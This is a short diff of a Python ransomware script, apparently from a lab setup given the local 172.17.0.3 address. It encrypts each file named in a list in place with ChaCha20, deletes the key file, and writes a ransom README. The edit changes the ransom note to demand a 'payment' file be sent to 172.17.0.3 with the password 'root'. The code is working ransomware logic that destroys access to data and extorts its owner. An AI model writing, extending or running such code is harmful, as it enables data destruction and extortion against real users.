@@ -36,10 +36,9 @@ with open("chkey.txt","rb") as keyfile:
 with open("testd.txt", "r") as file:
     for line in file:
         line = line.rstrip("\n")
-        print(line)
         encrypt_file_chacha20(key, line, line)
 
 
 readme = open("README","w")
-readme.write("Your System has been encrypted, please pay 1€ to receive the decryption key")
+readme.write("Your System has been encrypted, please send a file called 'payment' with 1€ to 172.17.0.3 : pw: root in order to receive the decryption key")
 os.remove("/chkey.txt")
